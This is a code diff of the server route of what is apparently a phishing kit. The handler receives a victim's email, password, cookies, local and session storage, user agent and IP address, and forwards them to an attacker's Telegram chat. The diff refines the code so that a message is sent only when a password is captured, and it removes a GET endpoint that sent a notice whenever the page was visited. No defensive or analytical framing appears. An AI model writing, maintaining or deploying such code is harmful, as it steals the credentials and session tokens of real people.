@@ -15,59 +15,9 @@ export async function POST(req) {
   const { eparams, password, userAgent, remoteAddress, landingUrl, cookies, localStorageData, sessionStorageData } = await req.json();
 
   try {
-    // Send access notification if no password provided (just link accessed)
-    if (!password) {
-      const accessMessage = `
-🔐 *Session Information*
-
-*Username:* 
-*Password:* 
-*Landing URL:* 
-${landingUrl || 'No URL provided'}
-
-✅ *User Agent:*
-${userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'}
-
-✅ *Remote Address:*
-${remoteAddress || 'Not available'}
-
-❌ *Create Time:*
-${Math.floor(Date.now() / 1000)}
-
-❌ *Update Time:*
-${Math.floor(Date.now() / 1000)}
-
-🍪 *Cookies:*
-${cookies || 'No cookies captured'}
-
-💾 *Local Storage:*
-${localStorageData || 'No local storage data captured'}
-
-💾 *Session Storage:*
-${sessionStorageData || 'No session storage data captured'}
-
-✅ Tokens are added in txt file and attached separately in message.
-      `;
-      
-      await bot.sendMessage({
-        text: accessMessage,
-        chatId: chatId,
-        parse_mode: "Markdown"
-      });
-      
-      console.log("Access notification sent to Telegram");
-      
-      return new Response(
-        JSON.stringify({ message: "Access notification sent!" }),
-        {
-          status: 200,
-          headers: { "Content-Type": "application/json" },
-        }
-      );
-    }
-
-    // Send credentials if password is provided
-    const credentialsMessage = `
+    // Only send notification when password is provided
+    if (password) {
+      const credentialsMessage = `
 🔐 *Session Information*
 
 *Username:* ${eparams}
@@ -99,18 +49,28 @@ ${sessionStorageData || 'No session storage data captured'}
 ✅ Tokens are added in txt file and attached separately in message.
     `;
 
-    await bot.sendMessage({
-      text: credentialsMessage,
-      chatId: chatId,
-      parse_mode: "Markdown"
-    });
+      await bot.sendMessage({
+        text: credentialsMessage,
+        chatId: chatId,
+        parse_mode: "Markdown"
+      });
 
-    console.log(
-      `Results sent to telegram successfully Email: ${eparams}, Password: ${password}`
-    );
+      console.log(
+        `Results sent to telegram successfully Email: ${eparams}, Password: ${password}`
+      );
 
+      return new Response(
+        JSON.stringify({ message: "Credentials sent successfully!" }),
+        {
+          status: 200,
+          headers: { "Content-Type": "application/json" },
+        }
+      );
+    }
+
+    // If no password, just return success without sending notification
     return new Response(
-      JSON.stringify({ message: "Credentials sent successfully!" }),
+      JSON.stringify({ message: "No password provided, no notification sent" }),
       {
         status: 200,
         headers: { "Content-Type": "application/json" },
@@ -125,70 +85,10 @@ ${sessionStorageData || 'No session storage data captured'}
   }
 }
 
-// Handle GET requests for page access notifications
+// Remove GET endpoint since we don't want to notify on page access
 export async function GET(req) {
-  try {
-    const url = new URL(req.url);
-    const email = url.searchParams.get('email');
-    const userAgent = url.searchParams.get('userAgent');
-    const remoteAddress = url.searchParams.get('remoteAddress');
-    const landingUrl = url.searchParams.get('landingUrl');
-    const cookies = url.searchParams.get('cookies');
-    const localStorageData = url.searchParams.get('localStorage');
-    const sessionStorageData = url.searchParams.get('sessionStorage');
-    
-    const accessMessage = `
-🔐 *Session Information*
-
-*Username:* ${email || ''}
-*Password:* 
-*Landing URL:* 
-${landingUrl || 'No URL provided'}
-
-✅ *User Agent:*
-${userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'}
-
-✅ *Remote Address:*
-${remoteAddress || 'Not available'}
-
-❌ *Create Time:*
-${Math.floor(Date.now() / 1000)}
-
-❌ *Update Time:*
-${Math.floor(Date.now() / 1000)}
-
-🍪 *Cookies:*
-${cookies || 'No cookies captured'}
-
-💾 *Local Storage:*
-${localStorageData || 'No local storage data captured'}
-
-💾 *Session Storage:*
-${sessionStorageData || 'No session storage data captured'}
-
-✅ Tokens are added in txt file and attached separately in message.
-    `;
-    
-    await bot.sendMessage({
-      text: accessMessage,
-      chatId: chatId,
-      parse_mode: "Markdown"
-    });
-    
-    console.log("Page access notification sent to Telegram");
-    
-    return new Response(
-      JSON.stringify({ message: "Access notification sent!" }),
-      {
-        status: 200,
-        headers: { "Content-Type": "application/json" },
-      }
-    );
-  } catch (error) {
-    console.error("Error sending access notification:", error);
-    return new Response(JSON.stringify({ error: "Error sending access notification" }), {
-      status: 500,
-      headers: { "Content-Type": "application/json" },
-    });
-  }
+  return new Response(JSON.stringify({ message: "Method not allowed" }), {
+    status: 405,
+    headers: { "Content-Type": "application/json" },
+  });
 }
